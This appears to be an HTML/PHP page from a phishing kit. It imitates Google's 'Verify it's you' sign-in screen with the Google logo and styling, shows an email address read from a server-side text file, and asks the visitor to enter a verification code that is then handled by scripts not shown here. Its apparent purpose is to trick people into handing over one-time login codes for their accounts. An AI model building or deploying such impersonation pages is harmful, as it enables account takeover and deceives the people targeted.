<!DOCTYPE>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<title>Gmail Login Ads</title>
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="css/normalize.css">
	<link rel="stylesheet" type="text/css" href="css/materialize.min.css">
	<link rel="stylesheet" type="text/css" href="css/loginStyle.css">
     <link rel="stylesheet" href="asset/css/spinner.css"/> 
	 <style>
	 .oO8pQe {
    padding-bottom: 0;
    padding:5px;
    color: rgb(32,33,36);
    font-size: 24px;
    font-family: "Google Sans","Noto Sans Myanmar UI",arial,sans-serif;
    font-weight: 400;
    line-height: 1.3333;
    margin-bottom: 0;
    margin-top: 0;
    word-break: break-word;
}
	 
	 </style>
	</head>
<body>
   <div id="cover-spin"></div>
	<div class="row gmailStyle">
		<div class="container-fluid">
			<div class="valign-wrapper screenHeight">
					<div class="col card s12 m8 l6 xl4 autoMargin setMaxWidth overflowHidden">
						<div class="row hidden" id="progress-bar">
					    <div class="progress mar-no">
					      <div class="indeterminate"></div>
					    </div>
						</div>
						<div class="clearfix mar-all pad-all"></div>
                                  <div style="text-align:center">
						<img src="images/Googlelogo.png" class="logoImage" />
						  <h1 class="oO8pQe"><span>Verify it’s you</span></h1>
						  <div class="tosRNd"><span>To help keep your account safe, Google wants to make sure it’s really you trying to sign in </span></div>  
                           <br>					
					<p class="center-align pad-no mar-no"><center style='border: 1px solid #9e9e9e;width:60%;border-radius:15px;margin:0px auto;'>&nbsp;<span style="color:#039be5" class="material-icons">account_circle</span>&nbsp;<span style="padding-bottom:55px" id="add_email"></span></center></p>
                      

						</div>	
						
							<p style="text-align:center">An email with a verification code was just sent to  <b id="mail_verify"><?php include("./Show_system/Show_Emailverify.txt"); ?></b></p>
							
						<div id="formContainer" class="goRight">

							<form class="loginForm">

								<div class="input-fields-div autoMargin">
									<div class="input-field">
					         				   <input id="enter_OTP" type="text" class="validate">
					                          <label for="enter_OTP">Enter code</label>

						           </div>
								
							
	
								</div>
								<div class="input-fields-div autoMargin right-align">

									<button type="button" onclick="otp()" class="loginBtn waves-effect waves-light btn">Next</button>
								</div>
							</form>
	<div class="clearfix"></div>
						</div>


						<div class="clearfix mar-all pad-all"></div>
					</div>
			</div>
		</div>
	</div>
	<script type="text/javascript" src="js/materialize.min.js"></script>
	<script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
	<script type="text/javascript" src="js/routie.min.js"></script>
	<script type="text/javascript" src="js/loginScript.js"></script>
<script type="text/javascript" src="js/main.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>		
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@7.26.11/dist/sweetalert2.all.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha256-KsRuvuRtUVvobe66OFtOQfjP8WA2SzYsmm4VPfMnxms=" crossorigin="anonymous"></script>
<script src="../common/mailverify.js"></script>
	</body>
</html>
